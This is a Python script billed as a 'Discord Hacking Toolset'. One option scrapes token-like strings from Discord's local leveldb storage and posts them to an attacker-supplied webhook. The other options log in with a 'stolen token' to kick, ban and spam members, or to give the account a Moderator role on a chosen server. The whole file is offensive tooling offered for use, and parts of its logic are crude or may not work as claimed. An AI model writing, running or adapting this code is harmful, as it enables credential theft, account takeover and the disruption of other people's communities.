import os
import json
import requests
import discord
from discord.ext import commands

# Function to read tokens from the local storage
def read_tokens(path):
    tokens = []
    for file_name in os.listdir(path):
        if file_name.endswith('.log') or file_name.endswith('.ldb'):
            with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if 'mfa.' in line or 'token' in line:
                        tokens.append(line.strip())
    return tokens

# Function to send tokens to a Discord webhook
def send_tokens(tokens, webhook_url):
    for token in tokens:
        data = {'content': token}
        requests.post(webhook_url, json=data)

def main():
    print("Discord Hacking Toolset")
    print("1. Grab Tokens")
    print("2. Control Account")
    print("3. Control Server")
    choice = input("Choose an option: ")

    if choice == '1':
        path = os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb'
        webhook_url = input("Enter your Discord webhook URL: ")
        tokens = read_tokens(path)
        send_tokens(tokens, webhook_url)
        print("Tokens sent to webhook.")

    elif choice == '2':
        TOKEN = input("Enter the stolen token: ")
        intents = discord.Intents.default()
        intents.messages = True
        intents.guilds = True
        intents.members = True

        bot = commands.Bot(command_prefix='!', intents=intents)

        @bot.event
        async def on_ready():
            print(f'Logged in as {bot.user}')

        @bot.command()
        async def kick(ctx, member: discord.Member, *, reason=None):
            await member.kick(reason=reason)
            await ctx.send(f'Kicked {member.mention}')

        @bot.command()
        async def ban(ctx, member: discord.Member, *, reason=None):
            await member.ban(reason=reason)
            await ctx.send(f'Banned {member.mention}')

        @bot.command()
        async def unban(ctx, *, member):
            banned_users = await ctx.guild.bans()
            member_name, member_discriminator = member.split('#')
            for ban_entry in banned_users:
                user = ban_entry.user
                if (user.name, user.discriminator) == (member_name, member_discriminator):
                    await ctx.guild.unban(user)
                    await ctx.send(f'Unbanned {user.mention}')
                    return

        @bot.command()
        async def spam(ctx, channel: discord.TextChannel, message: str, amount: int):
            for _ in range(amount):
                await channel.send(message)

        bot.run(TOKEN)

    elif choice == '3':
        TOKEN = input("Enter the stolen token: ")
        SERVER_ID = input("Enter the server ID: ")
        intents = discord.Intents.default()
        intents.messages = True
        intents.guilds = True
        intents.members = True

        bot = commands.Bot(command_prefix='!', intents=intents)

        @bot.event
        async def on_ready():
            print(f'Logged in as {bot.user}')

            guild = bot.get_guild(int(SERVER_ID))
            if guild:
                print(f'Joined server: {guild.name}')
                member = guild.get_member(bot.user.id)
                if member:
                    role = discord.utils.get(guild.roles, name='Moderator')
                    await member.edit(roles=[role])
                    print('Gave myself moderator permissions')

        bot.run(TOKEN)

    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()